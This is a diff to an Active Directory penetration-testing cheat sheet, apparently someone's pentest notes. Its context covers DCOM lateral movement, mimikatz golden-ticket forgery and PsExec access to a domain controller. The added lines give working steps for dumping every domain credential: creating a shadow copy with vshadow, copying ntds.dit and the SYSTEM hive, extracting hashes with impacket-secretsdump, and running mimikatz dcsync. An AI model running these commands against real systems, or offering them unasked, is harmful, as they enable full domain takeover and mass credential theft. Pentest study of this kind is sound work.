@@ -679,6 +679,7 @@ ls \\shared01\usernamesfolder
 #Distributed Component Object Model a.k.a. DCOM
 #DCOM communicates over RPC on TCP 135 and LA credentials are required to leverage the DCOM Service Control Manager (API)
 See enumhelper.ps1 for example usage for remote commands and reverse shell
+#Also other methods exist besides the one used in enumhelper leveraging MMC https://www.cybereason.com/blog/dcom-lateral-movement-techniques
 
 ##Persistence
 #Golden Ticket, a ticket forged using krbtgt password for which you need an account with access to Domain Admin's group or a compromized DC, using mimikatz:
@@ -691,3 +692,15 @@ kerberos::golden /user:nonprivileged_user /domain:testad.local /sid:S-1-5-21-123
 misc::cmd
 #Connecting to DC01 for example, needs to be done with the hostname, with IP the request will be blocked as the auth type would be NTLM:
 PsExec.exe \\DC01.testad.local cmd.exe
+
+#Shadow Copies can also be leveraged if you have a user belonging to Domain Admin group to gain AD Database (NTDS.dit), and then pop out all credentials
+#using vshadow to dump the database to disk (-p) and disable writes to speed up the process (-nw):
+vshadow.exe -nw -p  C:
+#Take note of the "Shadow copy device name" in the output, as that is needed to copy the dump:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\ntds\ntds.dit C:\ntds.dit.bak
+#The SYSTEM hive is also needed to extract from the dump:
+reg.exe save hklm\system C:\system_hive.bak
+#Then copy the files wherever and start extracting (LOCAL to define parsing files locally):
+impacket-secretsdump -ntds ntds.dit.bak -system system_hive.bak LOCAL
+#Or you can get hashes directly from DC with mimikatz if you have foothold on the DC:
+lsadump::dcsync /user:testad\target-username
